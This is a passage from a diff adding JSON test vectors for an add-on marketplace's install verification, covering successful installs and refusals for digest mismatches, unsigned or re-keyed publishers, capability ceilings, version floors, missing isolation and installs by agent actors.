+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "ok": {
+     "class": "other",
+     "id": "standup",
+     "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+     "tofu": "unsigned",
+     "version": "1.0.0"
+    }
+   },
+   "name": "install_ok_hub_allowed_in_ceiling"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": 7,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "ok": {
+     "class": "other",
+     "id": "standup",
+     "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+     "tofu": "unsigned",
+     "version": "1.0.0"
+    }
+   },
+   "name": "install_ok_same_version_index"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {
+      "standup": {
+       "origin": "https://github.com/acme/orch-market",
+       "version": "0.9.0"
+      }
+     },
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "ok": {
+     "class": "other",
+     "id": "standup",
+     "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+     "tofu": "unsigned",
+     "version": "1.0.0"
+    }
+   },
+   "name": "install_ok_same_origin_update"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "agent",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.actor_refused"
+   },
+   "name": "install_agent_refused"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "mandate",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.actor_refused"
+   },
+   "name": "install_mandate_refused"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('evil')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.digest_mismatch"
+   },
+   "name": "install_digest_mismatch_changed_file"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "extra.py": "x = 1\n",
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.digest_mismatch"
+   },
+   "name": "install_digest_mismatch_extra_file"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.package_invalid"
+   },
+   "name": "install_package_without_manifest"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": {
+      "allow": [
+       "https://github.com/acme/orch-market"
+      ],
+      "block": [],
+      "ceiling": [
+       "serve_http"
+      ]
+     },
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.capability_ceiling"
+   },
+   "name": "install_capability_outside_ceiling"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": {
+      "allow": [
+       "https://github.com/acme/orch-market"
+      ],
+      "block": [],
+      "ceiling": []
+     },
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.capability_ceiling"
+   },
+   "name": "install_empty_ceiling"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "1.9.0",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.min_orch"
+   },
+   "name": "install_min_orch_too_high"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.0.dev999",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.min_orch"
+   },
+   "name": "install_min_orch_dev_before_release"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {
+      "https://github.com/acme/orch-market|jira": "BMlyPZZElYwTNIMMA1ZFxa58Mathf1eNt_ZfmZdjNjESVgGHwHHgu2mwkMNzREBDL8i859JRPVLmCCwe0w8TnzE"
+     },
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\", \"serve_http\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"jira\", \"schema\": \"orch.addon/3\", \"title\": \"Jira\", \"version\": \"1.0.0\"}",
+     "requirements.txt": "# generated by uv export\nrequests==2.32.3 \\\n    --hash=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nidna==3.7 --hash=sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n"
+    },
+    "id": "jira",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network",
+        "serve_http"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "jira",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:50383dc9e008e3a6cde3a80b1d772cd30a53a1d9de466893af42d8fb7b9ad0ac",
+       "publisher": {
+        "key": "BBmy74NSZ2uabtb5xyo1ERHf65Yu_mYZXuuszXk2UPyX_gElcXlNAPLDd6mJgVaqwTsULdeMeUFZ0DWZZ8HN9XQ",
+        "sig": "3hXFVFR459upswu9f4IyxbF4yVwIW9OZkmjDaifHBge-fQxQTNNwJmaDZJPAkV7iITJ3C_aLn5gFCYxMmSXaXg"
+       },
+       "runtime": {
+        "kind": "python-requirements",
+        "lock": "requirements.txt"
+       },
+       "source": {
+        "git": "https://github.com/acme/jira",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.publisher_key_changed"
+   },
+   "name": "install_publisher_key_changed"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {
+      "https://github.com/acme/orch-market|jira": "BBmy74NSZ2uabtb5xyo1ERHf65Yu_mYZXuuszXk2UPyX_gElcXlNAPLDd6mJgVaqwTsULdeMeUFZ0DWZZ8HN9XQ"
+     },
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\", \"serve_http\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"jira\", \"schema\": \"orch.addon/3\", \"title\": \"Jira\", \"version\": \"1.0.0\"}",
+     "requirements.txt": "# generated by uv export\nrequests==2.32.3 \\\n    --hash=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nidna==3.7 --hash=sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n"
+    },
+    "id": "jira",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network",
+        "serve_http"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "jira",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:50383dc9e008e3a6cde3a80b1d772cd30a53a1d9de466893af42d8fb7b9ad0ac",
+       "runtime": {
+        "kind": "python-requirements",
+        "lock": "requirements.txt"
+       },
+       "source": {
+        "git": "https://github.com/acme/jira",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.publisher_key_changed"
+   },
+   "name": "install_publisher_key_removed"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\", \"serve_http\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"jira\", \"schema\": \"orch.addon/3\", \"title\": \"Jira\", \"version\": \"1.0.1\"}",
+     "requirements.txt": "# generated by uv export\nrequests==2.32.3 \\\n    --hash=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nidna==3.7 --hash=sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n"
+    },
+    "id": "jira",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network",
+        "serve_http"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "jira",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:90a54e8e2d0e5850fca2ad767c2de73544b9e26f585da6e042dcb36fb222f54c",
+       "publisher": {
+        "key": "BBmy74NSZ2uabtb5xyo1ERHf65Yu_mYZXuuszXk2UPyX_gElcXlNAPLDd6mJgVaqwTsULdeMeUFZ0DWZZ8HN9XQ",
+        "sig": "3hXFVFR459upswu9f4IyxbF4yVwIW9OZkmjDaifHBge-fQxQTNNwJmaDZJPAkV7iITJ3C_aLn5gFCYxMmSXaXg"
+       },
+       "runtime": {
+        "kind": "python-requirements",
+        "lock": "requirements.txt"
+       },
+       "source": {
+        "git": "https://github.com/acme/jira",
+        "subdir": "pkg"
+       },
+       "version": "1.0.1"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.bad_signature"
+   },
+   "name": "install_bad_signature"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": false,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.community_unisolated"
+   },
+   "name": "install_community_without_isolation"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": {
+      "allow": [
